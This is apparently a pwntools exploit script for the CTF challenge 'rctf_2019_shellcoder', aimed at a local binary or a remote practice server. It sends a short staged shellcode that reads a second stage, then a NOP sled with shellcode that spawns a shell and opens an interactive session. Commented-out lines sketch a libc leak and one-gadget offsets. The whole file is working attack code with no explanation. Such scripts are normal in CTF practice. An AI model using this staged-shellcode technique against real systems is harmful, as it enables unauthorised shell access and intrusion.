import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./rctf_2019_shellcoder')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./rctf_2019_shellcoder')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27034)
			elf=ELF('./rctf_2019_shellcoder')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		io.recv()
		shell1='''
		xchg rsi,rdi
		mov dl,0xff
		syscall
		'''
		# gdb.attach(io)
		# pause()
		io.send(asm(shell1))
		# shell2='''
		# xor rax,rax
		# mov dx,0xff
		# syscall
		# '''
		# io.send('\x90'*7+asm(shell2))

		io.send('\x90'*0x10+asm(shellcraft.sh()))



		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue